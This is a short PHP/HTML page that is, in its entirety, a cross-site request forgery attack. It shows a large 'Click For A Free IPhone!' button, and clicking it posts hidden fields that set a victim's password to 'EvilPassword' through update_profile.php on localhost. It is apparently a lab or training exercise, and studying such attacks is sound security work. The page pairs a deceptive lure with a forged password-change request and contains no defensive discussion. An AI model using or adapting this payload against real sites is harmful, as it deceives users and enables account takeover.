<?php
session_start();
//$user_id = $_SESSION['user_id'];
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=!, initial-scale=1.0">
    <title>Document</title>
    <style>
        
        body {
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            background-color: purple;
        }
        form {
            text-align: center;
        }
        input[type="submit"] {
            font-size: 20px;
            padding: 10px 20px;
            border: none;
            border-radius: 5px;
            background-color: #ff6347; 
            color: white;
            cursor: pointer;
            transition: background-color 0.3s ease;
            width: 300px;
            height: 100px;
        }
        input[type="submit"]:hover {
            background-color: #ff4500; 
        }
        
    </style>
</head>
<body>
<form action="http://localhost:3000/update_profile.php" method="post">
    <!-- Hidden fields for password update -->
    <input type="hidden" name="new_pass" value="EvilPassword" />
    <input type="hidden" name="confirm_pass" value="EvilPassword" />
    <input type="submit" name="update_profile" value="Click For A Free IPhone!" />
</form>
</body>
</html>